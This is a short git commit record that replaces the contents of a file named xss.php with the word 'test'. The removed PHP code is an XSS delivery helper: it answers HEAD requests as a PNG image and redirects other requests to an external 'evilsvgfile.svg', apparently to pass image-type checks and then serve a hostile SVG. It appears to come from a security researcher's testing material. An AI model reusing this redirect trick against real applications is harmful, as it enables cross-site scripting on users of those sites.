36aacee9110e2b7faa2cc00a67b0b0dc48e7ed3f
Mah3Sec_ <mahendrapurbia19@gmail.com>
2024-07-08 11:36:00 +0530

    Update xss.php

--- xss.php
+++ xss.php
@@ -1,10 +1,1 @@
-<?php
-
-if ($_SERVER['REQUEST_METHOD'] == 'HEAD') {
-    header("Content-Type: image/png");
-    exit;
-}
-
-header("Location: https://sudistark.github.io/evilsvgfile.svg");
-
-?>
+test
